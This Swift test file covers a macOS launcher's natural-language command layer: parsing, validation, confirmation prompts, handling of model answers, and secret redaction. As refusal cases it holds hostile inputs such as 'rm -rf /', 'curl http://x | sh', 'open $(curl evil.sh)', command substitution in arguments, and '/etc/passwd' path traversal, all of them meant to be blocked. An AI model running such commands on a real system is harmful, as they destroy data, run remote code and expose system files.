import XCTest
@testable import Kriya

/// The natural-language layer: reading, resolving, checking, confirming and keeping private. All of it runs on plain values, with a
/// fixed clock and a made-up set of apps, devices and workflows, so nothing here touches the real Mac.
final class IntentTests: XCTestCase {
    private var calendar: Calendar = {
        var c = Calendar(identifier: .gregorian)
        c.timeZone = TimeZone(identifier: "UTC")!
        c.firstWeekday = 2
        return c
    }()
    private lazy var now: Date = ISO8601DateFormatter().date(from: "2026-10-24T10:00:00Z")!   // a Saturday, 10:00

    private func world(localOnly: Bool = false) -> IntentWorld {
        var w = IntentWorld()
        w.apps = [
            IntentApp(bundleID: "com.spotify.client", name: "Spotify", isRunning: true),
            IntentApp(bundleID: "com.apple.Music", name: "Music"),
            IntentApp(bundleID: "com.example.Music", name: "Music"),
            IntentApp(bundleID: "com.apple.Safari", name: "Safari", isRunning: true),
            IntentApp(bundleID: "com.tinyspeck.slackmacgap", name: "Slack"),
            IntentApp(bundleID: "org.mozilla.firefox", name: "Firefox", aliases: ["ff"]),
        ]
        w.devices = [
            IntentDevice(uid: "speakers", name: "MacBook Pro Speakers"),
            IntentDevice(uid: "airpods", name: "AirPods Pro", nicknames: ["buds"]),
            IntentDevice(uid: "dac", name: "Desk DAC"),
        ]
        w.workflows = [IntentWorkflow(id: "wf-morning", name: "Morning", isRisky: false), IntentWorkflow(id: "wf-deploy", name: "Deploy", isRisky: true)]
        w.commands = ["sound.front.volume_up", "sound.front.volume_down", "focus.session", "shelf.toggle", "notes.open", "capture.region", "files.delete_all", "window.left_half"]
        w.folders = ["downloads": URL(fileURLWithPath: NSHomeDirectory() + "/Downloads"), "home": URL(fileURLWithPath: NSHomeDirectory())]
        w.recentFile = { kind in kind == "screenshot" ? URL(fileURLWithPath: NSHomeDirectory() + "/Desktop/Screenshot 1.png") : nil }
        w.fileExists = { _ in true }
        w.now = now
        w.calendar = calendar
        w.frontAppBundleID = "com.apple.Safari"
        w.localOnly = localOnly
        return w
    }

    private func intent(_ text: String, file: StaticString = #filePath, line: UInt = #line) -> ResolvedIntent? {
        if case .intent(let r) = IntentParser.parse(text, world: world()) { return r }
        XCTFail("“\(text)” did not read as one clear request: \(IntentParser.parse(text, world: world()))", file: file, line: line)
        return nil
    }

    // MARK: Time, numbers and percentages

    func testDurationsAreReadFromWords() {
        func seconds(_ text: String) -> TimeInterval? { IntentText.extractDuration(from: IntentText.normalize(text), now: now, calendar: calendar)?.value }
        XCTAssertEqual(seconds("5 minutes"), 300)
        XCTAssertEqual(seconds("for an hour"), 3600)
        XCTAssertEqual(seconds("1 hour 30 minutes"), 5400)
        XCTAssertEqual(seconds("half an hour"), 1800)
        XCTAssertEqual(seconds("an hour and a half"), 5400)
        XCTAssertEqual(seconds("90 seconds"), 90)
        XCTAssertEqual(seconds("forty five minutes"), 2700)
        XCTAssertEqual(seconds("2h30m"), 9000)
        XCTAssertEqual(seconds("until 3pm"), 5 * 3600, "10:00 to 15:00")
        XCTAssertEqual(seconds("until 9:30 am"), 23.5 * 3600, "already past today, so tomorrow")
        XCTAssertEqual(seconds("until noon"), 2 * 3600)
        XCTAssertEqual(seconds("until 15:00"), 5 * 3600)
        XCTAssertNil(seconds("until 5"), "a bare number is not a time of day")
        XCTAssertNil(seconds("spotify"))
    }

    func testPercentagesAreReadFromWords() {
        func percent(_ text: String) -> Double? { IntentText.extractPercent(from: IntentText.normalize(text))?.value }
        XCTAssertEqual(percent("40%"), 40)
        XCTAssertEqual(percent("40 percent"), 40)
        XCTAssertEqual(percent("set volume to 40"), 40)
        XCTAssertEqual(percent("volume forty"), 40)
        XCTAssertEqual(percent("volume twenty five"), 25)
        XCTAssertEqual(percent("a hundred percent"), 100)
        XCTAssertNil(percent("set a timer to 5 minutes"), "a time is not a level")
    }

    func testFillersAndNumberWordsAreTidied() {
        XCTAssertEqual(IntentText.normalize("  Could you PLEASE mute Spotify for me?  "), "mute spotify")
        XCTAssertEqual(IntentText.normalize("hey kriya, set a timer for an hour"), "set a timer for 1 hour")
        XCTAssertEqual(IntentText.normalize("play the one with the cat"), "play the one with the cat", "“one” is not a number here")
    }

    // MARK: Apps and ambiguity

    func testAnAppIsFoundByNameBundleOrAlias() {
        let w = world()
        XCTAssertEqual(w.resolveApp("Spotify"), .one(w.apps[0], confidence: 1))
        XCTAssertEqual(w.resolveApp("the spotify app"), .one(w.apps[0], confidence: 1))
        XCTAssertEqual(w.resolveApp("ff"), .one(w.apps[5], confidence: 1))
        XCTAssertEqual(w.resolveApp("com.apple.Safari"), .one(w.apps[3], confidence: 1))
        if case .one(let app, let confidence) = w.resolveApp("spot") { XCTAssertEqual(app.name, "Spotify"); XCTAssertLessThan(confidence, 1) } else { XCTFail() }
        XCTAssertEqual(w.resolveApp("this"), .one(w.apps[3], confidence: 1), "the app in front")
        XCTAssertEqual(w.resolveApp("nothing like this"), .none)
    }

    func testTwoAppsWithOneNameAreListedNotGuessed() {
        guard case .ambiguous(let question, let choices) = IntentParser.parse("open music", world: world()) else { return XCTFail() }
        XCTAssertEqual(question, "I found two apps named Music.")
        XCTAssertEqual(choices.count, 2)
        XCTAssertTrue(choices.map(\.intent).contains(.openApp(bundleID: "com.apple.Music")))
        XCTAssertTrue(choices.map(\.intent).contains(.openApp(bundleID: "com.example.Music")))
        XCTAssertEqual(Set(choices.map(\.title)).count, 2, "the two rows can be told apart")
        guard case .ambiguous(let q2, _) = IntentParser.parse("mute music for 5 minutes", world: world()) else { return XCTFail() }
        XCTAssertEqual(q2, "I found two apps named Music.")
    }

    // MARK: Requests

    func testMuteWithATime() {
        XCTAssertEqual(intent("mute spotify for an hour")?.intent, .muteApp(appID: "com.spotify.client", seconds: 3600))
        XCTAssertEqual(intent("Could you please mute Spotify for 5 minutes")?.intent, .muteApp(appID: "com.spotify.client", seconds: 300))
        XCTAssertEqual(intent("mute spotify until 3pm")?.intent, .muteApp(appID: "com.spotify.client", seconds: 18_000))
        XCTAssertEqual(intent("mute spotify")?.intent, .muteApp(appID: "com.spotify.client", seconds: nil))
        XCTAssertEqual(intent("mute everything")?.intent, .muteApp(appID: IntentWorld.systemApp, seconds: nil))
        XCTAssertEqual(intent("unmute spotify")?.intent, .unmuteApp(appID: "com.spotify.client"))
        XCTAssertEqual(intent("mute this for 10 minutes")?.intent, .muteApp(appID: "com.apple.Safari", seconds: 600))
        XCTAssertEqual(intent("mute everything except spotify")?.intent, .muteAllExcept(appID: "com.spotify.client"))
        guard case .rejected(let reason) = IntentParser.parse("mute spotify for 48 hours", world: world()) else { return XCTFail() }
        XCTAssertTrue(reason.contains("24 hours"))
        guard case .rejected(let missing) = IntentParser.parse("mute nosuchapp", world: world()) else { return XCTFail() }
        XCTAssertTrue(missing.contains("nosuchapp"))
    }

    func testVolume() {
        XCTAssertEqual(intent("set spotify volume to 40%")?.intent, .setVolume(appID: "com.spotify.client", value: 0.4))
        XCTAssertEqual(intent("spotify volume forty")?.intent, .setVolume(appID: "com.spotify.client", value: 0.4))
        XCTAssertEqual(intent("set the volume to 40 percent")?.intent, .setVolume(appID: IntentWorld.systemApp, value: 0.4))
        XCTAssertEqual(intent("volume 0")?.intent, .setVolume(appID: IntentWorld.systemApp, value: 0))
        XCTAssertEqual(intent("turn up the volume")?.intent, .runCommand("sound.front.volume_up", arguments: [:]))
        guard case .rejected(let reason) = IntentParser.parse("set spotify volume to 900%", world: world()) else { return XCTFail() }
        XCTAssertTrue(reason.contains("400%"))
    }

    func testWindowPlacement() {
        XCTAssertEqual(intent("move this window to the left half")?.intent, .moveWindow(.leftHalf))
        XCTAssertEqual(intent("snap top right")?.intent, .moveWindow(.topRight))
        XCTAssertEqual(intent("put it on the bottom half")?.intent, .moveWindow(.bottomHalf))
        XCTAssertEqual(intent("maximize window")?.intent, .moveWindow(.maximize))
        XCTAssertEqual(intent("move window to the first third")?.intent, .moveWindow(.firstThird))
        XCTAssertEqual(intent("move the window to the right two thirds")?.intent, .moveWindow(.lastTwoThirds))
        XCTAssertEqual(intent("move this window to the bottom left sixth")?.intent, .moveWindow(.bottomLeftSixth))
        XCTAssertEqual(IntentParser.parse("move to trash", world: world()), .notAnIntent, "not a place")
    }

    func testTimersAndFocus() {
        XCTAssertEqual(intent("set a timer for 5 minutes")?.intent, .startTimer(seconds: 300, label: nil))
        XCTAssertEqual(intent("set a timer for an hour")?.intent, .startTimer(seconds: 3600, label: nil))
        XCTAssertEqual(intent("start a 10 minute timer called pasta")?.intent, .startTimer(seconds: 600, label: "pasta"))
        XCTAssertEqual(intent("remind me in 20 minutes to stretch")?.intent, .startTimer(seconds: 1200, label: "stretch"))
        XCTAssertEqual(IntentParser.parse("timer 5m", world: world()), .notAnIntent, "an explicit keyword command is left to the launcher")
        XCTAssertEqual(intent("start a 25 minute focus session")?.intent, .startFocusSession(minutes: 25))
        XCTAssertEqual(intent("focus for an hour")?.intent, .startFocusSession(minutes: 60))
        XCTAssertEqual(intent("start focus")?.intent, .runCommand("focus.session", arguments: [:]))
        guard case .rejected(let reason) = IntentParser.parse("focus for 10 hours", world: world()) else { return XCTFail() }
        XCTAssertTrue(reason.contains("480"))
        guard case .rejected = IntentParser.parse("set a timer for 3 days", world: world()) else { return XCTFail() }
        guard case .rejected(let how) = IntentParser.parse("set a timer", world: world()) else { return XCTFail() }
        XCTAssertTrue(how.contains("How long"))
    }

    func testSoundOutput() {
        let airpods = intent("switch audio output to airpods")
        XCTAssertEqual(airpods?.intent, .chooseAudioOutput(deviceUID: "airpods"))
        XCTAssertTrue(airpods?.risk.needsConfirmation == true, "routing all sound asks first")
        XCTAssertEqual(intent("play sound on buds")?.intent, .chooseAudioOutput(deviceUID: "airpods"), "a nickname")
        guard case .needsInput(let question, let choices) = IntentParser.parse("switch the sound output", world: world()) else { return XCTFail() }
        XCTAssertEqual(question, "Which output device should I use?")
        XCTAssertEqual(choices.count, 3)
        guard case .needsInput(let q2, _) = IntentParser.parse("switch audio output to the moon", world: world()) else { return XCTFail() }
        XCTAssertTrue(q2.contains("moon"))
    }

    func testWorkflowsAndTheirRisk() {
        let safe = intent("run my morning workflow")
        XCTAssertEqual(safe?.intent, .runWorkflow(id: "wf-morning"))
        XCTAssertEqual(safe?.risk, .safe)
        let risky = intent("run the deploy workflow")
        XCTAssertEqual(risky?.intent, .runWorkflow(id: "wf-deploy"))
        XCTAssertTrue(risky?.risk.needsConfirmation == true)
        guard case .rejected(let reason) = IntentParser.parse("run the nonexistent workflow", world: world()) else { return XCTFail() }
        XCTAssertEqual(reason, "The requested workflow does not exist.")
        XCTAssertEqual(IntentParser.parse("turn on cinema mode", world: world()), .notAnIntent, "“mode” alone is not a claim that a workflow exists")
    }

    func testFilesWebCaptureShelfAndSettings() {
        XCTAssertEqual(intent("find pdfs from last week")?.intent, .searchFiles(query: "pdfs", range: .lastWeek))
        XCTAssertEqual(intent("find my budget spreadsheet from yesterday")?.intent, .searchFiles(query: "budget spreadsheet", range: .yesterday))
        XCTAssertEqual(intent("show files from the last 3 days")?.intent, .searchFiles(query: "", range: .lastDays(3)))
        XCTAssertEqual(intent("search youtube for lofi beats")?.intent, .webSearch(engine: "youtube", query: "lofi beats"))
        XCTAssertEqual(intent("google swift concurrency")?.intent, .webSearch(engine: "google", query: "swift concurrency"))
        XCTAssertEqual(intent("search the web for best pizza")?.intent, .webSearch(engine: "google", query: "best pizza"))
        XCTAssertEqual(intent("search for cats on duckduckgo")?.intent, .webSearch(engine: "duckduckgo", query: "cats"))
        XCTAssertEqual(intent("take a screenshot of the window")?.intent, .capture(.window, action: .normal))
        XCTAssertEqual(intent("take a screenshot")?.intent, .capture(.region, action: .normal))
        XCTAssertEqual(intent("record the screen")?.intent, .capture(.screen, action: .recordScreen))
        XCTAssertEqual(intent("copy text from the screen")?.intent, .capture(.region, action: .text))
        XCTAssertEqual(intent("add the latest screenshot to the shelf")?.intent, .addToShelf([URL(fileURLWithPath: NSHomeDirectory() + "/Desktop/Screenshot 1.png")]))
        guard case .rejected = IntentParser.parse("add the latest download to the shelf", world: world()) else { return XCTFail("nothing recent to add") }
        XCTAssertEqual(intent("open sound settings")?.intent, .openSettings(.sound, tab: nil))
        XCTAssertEqual(intent("how much disk space do i have")?.intent, .openSettings(.diskMap, tab: nil))
        XCTAssertEqual(intent("find notes about taxes")?.intent, .searchNotes("taxes"))
        XCTAssertEqual(intent("search my clipboard for invoice")?.intent, .searchClipboard("invoice"))
        XCTAssertEqual(intent("find the tab about swift")?.intent, .searchBrowserTabs("swift"))
        XCTAssertEqual(intent("open my downloads folder")?.intent, .openFile(URL(fileURLWithPath: NSHomeDirectory() + "/Downloads")))
        XCTAssertEqual(intent("open safari")?.intent, .openApp(bundleID: "com.apple.Safari"))
        XCTAssertEqual(intent("open ff")?.intent, .openApp(bundleID: "org.mozilla.firefox"))
    }

    func testSeveralRequestsInOneSentence() {
        guard case .sequence(let steps)? = intent("mute spotify and move this window to the left half")?.intent else { return XCTFail() }
        XCTAssertEqual(steps, [.muteApp(appID: "com.spotify.client", seconds: nil), .moveWindow(.leftHalf)])
        XCTAssertEqual(intent("mute spotify for 1 hour and 30 minutes")?.intent, .muteApp(appID: "com.spotify.client", seconds: 5400), "“and” inside a time does not split")
        let risky = intent("mute everything except spotify and set a timer for 5 minutes")
        XCTAssertTrue(risky?.risk.needsConfirmation == true, "one step that asks makes the whole sentence ask")
    }

    func testTextThatIsNotARequestIsLeftToSearch() {
        for text in ["spotify", "invoice from acme", "open nothingsuch", "what time is it", "weather in paris", "mute", "", "   ", "? mute spotify", "yt cats", "g mute spotify"] {
            XCTAssertEqual(IntentParser.parse(text, world: world()), .notAnIntent, "“\(text)” stays normal search")
        }
    }

    // MARK: Safety

    func testDangerousRequestsAreRefusedOrAskFirst() {
        for text in ["delete my downloads folder", "erase everything in documents", "rename all files in documents", "wipe the disk"] {
            guard case .rejected = IntentParser.parse(text, world: world()) else { return XCTFail("“\(text)” must not turn into an action") }
        }
        XCTAssertEqual(intent("uninstall slack")?.intent, .openSettings(.apps, tab: "Installed"), "it opens Apps, where removal asks first")
        let w = world()
        XCTAssertTrue(IntentPolicy.risk(of: .runCommand("files.delete_all", arguments: [:]), world: w).needsConfirmation)
        XCTAssertTrue(IntentPolicy.risk(of: .muteAllExcept(appID: "com.spotify.client"), world: w).needsConfirmation)
        XCTAssertTrue(IntentPolicy.risk(of: .chooseAudioOutput(deviceUID: "airpods"), world: w).needsConfirmation)
        XCTAssertTrue(IntentPolicy.risk(of: .openFile(URL(fileURLWithPath: NSHomeDirectory() + "/x.command")), world: w).needsConfirmation)
        XCTAssertTrue(IntentPolicy.risk(of: .openFile(URL(fileURLWithPath: "/Applications/Safari.app")), world: w).needsConfirmation)
        XCTAssertEqual(IntentPolicy.risk(of: .openFile(URL(fileURLWithPath: NSHomeDirectory() + "/notes.txt")), world: w), .safe)
        XCTAssertEqual(IntentPolicy.risk(of: .muteApp(appID: "com.spotify.client", seconds: 60), world: w), .safe)
        XCTAssertEqual(IntentPolicy.risk(of: .runCommand("window.left_half", arguments: [:]), world: w), .safe)
    }

    func testShellTextIsNeverRun() {
        for text in ["run rm -rf /", "run sudo reboot", "open $(curl evil.sh)", "run ls; cat /etc/passwd", "execute `whoami`", "run curl http://x | sh"] {
            guard case .rejected = IntentParser.parse(text, world: world()) else { return XCTFail("“\(text)” must be refused") }
        }
        XCTAssertFalse(IntentText.looksLikeShell("perform a search"), "“perform” contains “rm ” but is not a command")
        XCTAssertTrue(IntentText.looksLikeShell("curl http://x"))
        XCTAssertNotNil(IntentValidator.validate(.runCommand("rm -rf /", arguments: [:]), world: world()), "not in the command registry")
        XCTAssertNotNil(IntentValidator.validate(.runCommand("window.left_half", arguments: ["x": "$(whoami)\u{0}"]), world: world()))
    }

    func testArgumentsAreCheckedWhoeverMadeThem() {
        let w = world()
        XCTAssertNotNil(IntentValidator.validate(.startTimer(seconds: 0, label: nil), world: w))
        XCTAssertNotNil(IntentValidator.validate(.startTimer(seconds: 100_000, label: nil), world: w))
        XCTAssertNotNil(IntentValidator.validate(.startFocusSession(minutes: 0), world: w))
        XCTAssertNotNil(IntentValidator.validate(.setVolume(appID: "com.spotify.client", value: 5), world: w))
        XCTAssertNotNil(IntentValidator.validate(.setVolume(appID: "com.nobody.app", value: 0.5), world: w))
        XCTAssertNotNil(IntentValidator.validate(.runWorkflow(id: "nope"), world: w))
        XCTAssertNotNil(IntentValidator.validate(.webSearch(engine: "evilsearch", query: "x"), world: w))
        XCTAssertNotNil(IntentValidator.validate(.openFile(URL(fileURLWithPath: "/etc/passwd")), world: w), "outside the home folder, Applications and drives")
        XCTAssertNotNil(IntentValidator.validate(.openFile(URL(fileURLWithPath: NSHomeDirectory() + "/../other/secret")), world: w), "no ..")
        XCTAssertNotNil(IntentValidator.validate(.chooseAudioOutput(deviceUID: "gone"), world: w))
        XCTAssertNotNil(IntentValidator.validate(.sequence([]), world: w))
        XCTAssertNil(IntentValidator.validate(.startTimer(seconds: 90, label: "tea"), world: w))
    }

    // MARK: The AI path

    private func answer(_ json: String) -> IntentParseResult { IntentAI.decode(json, world: world()) }

    func testAStrictAnswerBecomesTheSameKindOfIntent() {
        guard case .intent(let r) = answer("```json\n{\"intent\":\"muteApp\",\"args\":{\"app\":\"Spotify\",\"seconds\":3600}}\n```") else { return XCTFail() }
        XCTAssertEqual(r.intent, .muteApp(appID: "com.spotify.client", seconds: 3600))
        XCTAssertEqual(r.source, .ai)
        guard case .intent(let v) = answer(#"{"intent":"setVolume","args":{"percent":30}}"#) else { return XCTFail() }
        XCTAssertEqual(v.intent, .setVolume(appID: IntentWorld.systemApp, value: 0.3))
        guard case .intent(let w) = answer(#"{"intent":"moveWindow","args":{"placement":"top right"}}"#) else { return XCTFail() }
        XCTAssertEqual(w.intent, .moveWindow(.topRight))
        guard case .intent(let d) = answer(#"{"intent":"runWorkflow","args":{"name":"deploy"}}"#) else { return XCTFail() }
        XCTAssertTrue(d.risk.needsConfirmation, "the same confirmation as a request read by pattern")
        guard case .ambiguous = answer(#"{"intent":"openApp","args":{"app":"music"}}"#) else { return XCTFail("two Musics are still listed, not guessed") }
    }

    func testAnythingOutsideTheSchemaIsThrownAway() {
        let bad = [
            #"{"intent":"runShell","args":{"command":"rm -rf /"}}"#,                          // unknown intent
            #"{"intent":"muteApp","args":{"app":"Spotify","force":true}}"#,                  // unknown argument
            #"{"intent":"setVolume","args":{"app":"Spotify"}}"#,                             // missing percent
            #"{"intent":"setVolume","args":{"percent":"loud"}}"#,                            // not a number
            #"{"intent":"muteApp","args":{"app":"Spotify","seconds":-5}}"#,                  // invalid duration
            #"{"intent":"muteApp","args":{"app":"Spotify","seconds":999999}}"#,
            #"{"intent":"muteApp","args":{"app":"NoSuchApp"}}"#,                             // app does not resolve
            #"{"intent":"runWorkflow","args":{"name":"nonexistent"}}"#,                      // unknown workflow
            #"{"intent":"runCommand","args":{"command":"rm.everything"}}"#,                  // not in the registry
            #"{"intent":"runCommand","args":{"command":"window.left_half","arguments":{"x":"$(whoami)"}}}"#, // shell text
            #"{"intent":"webSearch","args":{"query":"x; rm -rf /"}}"#,                       // shell text
            #"{"intent":"openFile","args":{"path":"/etc/passwd"}}"#,                         // path outside the allowed places
            #"{"intent":"openFile","args":{"path":"~/../../etc/passwd"}}"#,
            #"{"intent":"startTimer","args":{"seconds":60},"extra":1}"#,                     // extra top-level part
            #"{"intent":"askAI","args":{"question":"hi"}}"#,                                 // not something a model may ask for
            #"{"intent":"sequence","args":{}}"#,
            "not json at all", "", "[]",
        ]
        for json in bad {
            guard case .rejected = answer(json) else { return XCTFail("must be refused: \(json) → \(answer(json))") }
        }
        guard case .intent(let ok) = answer(#"{"intent":"search","args":{"query":"hello"}}"#) else { return XCTFail() }
        XCTAssertEqual(ok.intent, .search("hello"))
    }

    func testSecretsAreHiddenBeforeAnythingIsSent() {
        let prepared = IntentAI.prepare("my key is sk-abcdefghijklmnopqrstuvwxyz123456 and my email is me@example.com, mute spotify")
        XCTAssertFalse(prepared.text.contains("sk-abcdefghijklmnopqrstuvwxyz123456"))
        XCTAssertFalse(prepared.text.contains("me@example.com"))
        XCTAssertGreaterThanOrEqual(prepared.hidden, 2)
        XCTAssertTrue(prepared.text.contains("mute spotify"))
        XCTAssertFalse(IntentAI.systemPrompt.contains("com.spotify"), "no app names or identifiers are sent along")
        XCTAssertEqual(IntentAI.prepare("mute spotify").hidden, 0)
    }

    func testLocalOnlyModeSendsNothing() {
        guard case .rejected(let reason) = IntentParser.parse("ask ai what is the capital of france", world: world(localOnly: true)) else { return XCTFail() }
        XCTAssertTrue(reason.contains("Local-only"))
        guard case .intent = IntentParser.parse("ask ai what is the capital of france", world: world()) else { return XCTFail() }
        let launcher = IntentLauncher()
        var asked = false
        launcher.askModel = { _, _ in asked = true; return .notAnIntent }
        launcher.world = { self.world(localOnly: true) }
        var message = ""
        launcher.hooks.message = { text, _ in message = text }
        launcher.understand("mute spotify please")
        RunLoop.current.run(until: Date().addingTimeInterval(0.3))
        XCTAssertFalse(asked, "the model is not called at all")
        XCTAssertTrue(message.contains("Local-only"))
    }

    // MARK: The launcher rows, confirmation and privacy

    private func launcher(understand: Bool = false, interpret: Bool = true) -> (IntentLauncher, Recorder) {
        let l = IntentLauncher()
        let recorder = Recorder()
        l.world = { self.world() }
        var data = LauncherPrefsData()
        data.interpretRequests = interpret ? nil : false
        data.understandRequests = understand ? true : nil
        l.prefs = { data }
        l.hooks.startTimer = { s, _ in recorder.events.append("timer \(s)") }
        l.hooks.runWorkflow = { recorder.events.append("workflow \($0)") }
        l.hooks.mute = { id, s in recorder.events.append("mute \(id) \(s.map { String($0) } ?? "-")") }
        l.hooks.setVolume = { id, v in recorder.events.append("volume \(id) \(v)") }
        l.hooks.message = { text, _ in recorder.messages.append(text) }
        l.audit = { recorder.audit.append($0) }
        return (l, recorder)
    }

    private final class Recorder { var events: [String] = []; var messages: [String] = []; var audit: [String] = [] }

    func testTheInterpretationRowShowsWhatWasUnderstoodAndRunsIt() throws {
        let (l, recorder) = launcher()
        let rows = l.entries(for: "mute spotify for an hour")
        XCTAssertEqual(rows.count, 1)
        let row = try XCTUnwrap(rows.first)
        XCTAssertEqual(row.title, "Mute Spotify for 1 hour")
        XCTAssertTrue(row.subtitle?.contains("Runs now") == true)
        XCTAssertEqual(row.actions.first?.title, "Why this?")
        row.run()
        XCTAssertEqual(recorder.events, ["mute com.spotify.client 3600.0"])
        XCTAssertTrue(l.entries(for: "spotify").isEmpty, "ordinary text gets no row")
        XCTAssertTrue(l.entries(for: "invoice from acme").isEmpty)
    }

    func testARequestThatAsksFirstDoesNothingUntilConfirmed() {
        let (l, recorder) = launcher()
        var asked: [String] = []
        l.confirm = { resolved, reason in asked.append(reason); return false }
        l.entries(for: "run the deploy workflow").first?.run()
        XCTAssertEqual(asked.count, 1)
        XCTAssertTrue(recorder.events.isEmpty, "Cancel runs nothing")
        l.confirm = { _, _ in true }
        l.entries(for: "run the deploy workflow").first?.run()
        XCTAssertEqual(recorder.events, ["workflow wf-deploy"])
        XCTAssertTrue(l.entries(for: "run the deploy workflow").first?.subtitle?.contains("Asks first") == true)
    }

    func testAmbiguityAndFailuresAreSaidInPlainWords() {
        let (l, _) = launcher()
        let rows = l.entries(for: "open music")
        XCTAssertEqual(rows.first?.title, "I found two apps named Music.")
        XCTAssertEqual(rows.count, 3, "the question and one row for each")
        XCTAssertEqual(l.entries(for: "switch the sound output").first?.title, "Which output device should I use?")
        XCTAssertEqual(l.entries(for: "run the nonexistent workflow").first?.title, "The requested workflow does not exist.")
        XCTAssertEqual(l.entries(for: "run the nonexistent workflow").first?.subtitle, "Nothing was done")
    }

    func testTheSwitchesTurnTheLayerOffAndTheAIRowOnOnlyWhenAsked() {
        XCTAssertTrue(launcher(interpret: false).0.entries(for: "mute spotify for an hour").isEmpty)
        let (on, _) = launcher(understand: true)
        XCTAssertTrue(on.entries(for: "what should i cook with eggs tonight").first?.id.hasPrefix("intent:ai:") == true, "a sentence the patterns cannot read is offered to the AI, not sent")
        XCTAssertTrue(on.entries(for: "? remind me about the thing").first?.id.hasPrefix("intent:ai:") == true)
        XCTAssertTrue(on.entries(for: "spotify").isEmpty, "one word is not a sentence")
        let (off, _) = launcher()
        XCTAssertTrue(off.entries(for: "what should i cook with eggs tonight").isEmpty, "off by default")
        XCTAssertTrue(off.entries(for: "? remind me about the thing").first?.id.hasPrefix("intent:ai:") == true, "a leading ? is the request itself")
    }

    func testAnAIAnswerIsAlwaysShownBeforeItRuns() throws {
        try XCTSkipIf(LocalOnly.isOn, "Local-only mode is on for this Mac")
        let (l, recorder) = launcher(understand: true)
        l.askModel = { _, w in IntentAI.decode(#"{"intent":"startTimer","args":{"seconds":120}}"#, world: w) }
        var shown: [ResolvedIntent] = []
        l.confirm = { resolved, _ in shown.append(resolved); return true }
        l.understand("hey set a thing for two minutes")
        let ran = expectation(description: "ran")
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.4) { ran.fulfill() }
        wait(for: [ran], timeout: 5)
        XCTAssertEqual(shown.count, 1, "even a safe request read by a model is shown first")
        XCTAssertEqual(shown.first?.source, .ai)
        XCTAssertEqual(recorder.events, ["timer 120.0"])
        // Cancelling runs nothing.
        recorder.events.removeAll()
        l.confirm = { _, _ in false }
        l.understand("hey set a thing for two minutes")
        let cancelled = expectation(description: "cancelled")
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.4) { cancelled.fulfill() }
        wait(for: [cancelled], timeout: 5)
        XCTAssertTrue(recorder.events.isEmpty)
    }

    func testOnlyMetadataIsAuditedAndRequestsAreNeverKeptInHistory() throws {
        let (l, recorder) = launcher()
        l.entries(for: "set spotify volume to 40%").first?.run()
        l.confirm = { _, _ in false }
        l.entries(for: "run the deploy workflow").first?.run()
        XCTAssertEqual(recorder.audit.count, 2)
        for line in recorder.audit {
            XCTAssertFalse(line.contains("40"), line)
            XCTAssertFalse(line.lowercased().contains("spotify"), line)
            XCTAssertFalse(line.lowercased().contains("deploy"), line)
        }
        XCTAssertTrue(recorder.audit[0].contains("setVolume"))
        XCTAssertTrue(recorder.audit[1].contains("cancelled"))

        let suite = UserDefaults(suiteName: "kriya-tests-\(UUID().uuidString)")!
        let store = SearchHistoryStore(defaults: suite)
        store.isEnabled = true
        for request in ["mute spotify for an hour", "set a timer for 5 minutes", "? remind me about the dentist", "run the deploy workflow", "move this window to the left half"] { store.record(request) }
        store.record("quarterly budget notes")
        XCTAssertEqual(store.history.recent(10).map(\.text), ["quarterly budget notes"], "searches are kept, requests are not")
    }

    func testSpotlightQueriesCannotBeInjected() {
        let predicate = IntentLauncher.spotlightPredicate(query: "pdfs bud\"get *", range: .lastWeek, now: now, calendar: calendar)
        XCTAssertTrue(predicate.contains("kMDItemContentTypeTree == \"com.adobe.pdf\""))
        XCTAssertTrue(predicate.contains("kMDItemDisplayName == \"*budget*\"cd"))
        XCTAssertFalse(predicate.contains("bud\"get"))
        // Today is Saturday 24 October and the week starts on Monday: this week began on the 19th, so last week is the 12th to the 19th.
        XCTAssertTrue(predicate.contains("$time.iso(2026-10-12T00:00:00Z)"), predicate)
        XCTAssertTrue(predicate.contains("$time.iso(2026-10-19T00:00:00Z)"), predicate)
    }

    func testDateRangesFollowTheCalendar() {
        let last = IntentDateRange.lastWeek.interval(now: now, calendar: calendar)
        XCTAssertEqual(last.duration, 7 * 86_400)
        XCTAssertLessThan(last.end, now)
        let yesterday = IntentDateRange.yesterday.interval(now: now, calendar: calendar)
        XCTAssertEqual(yesterday.start, ISO8601DateFormatter().date(from: "2026-10-23T00:00:00Z"))
        XCTAssertEqual(yesterday.end, ISO8601DateFormatter().date(from: "2026-10-24T00:00:00Z"))
        XCTAssertEqual(IntentDateRange.lastMonth.interval(now: now, calendar: calendar).start, ISO8601DateFormatter().date(from: "2026-09-01T00:00:00Z"))
        XCTAssertEqual(IntentDateRange.lastDays(3).interval(now: now, calendar: calendar).start, ISO8601DateFormatter().date(from: "2026-10-21T00:00:00Z"))
    }
}
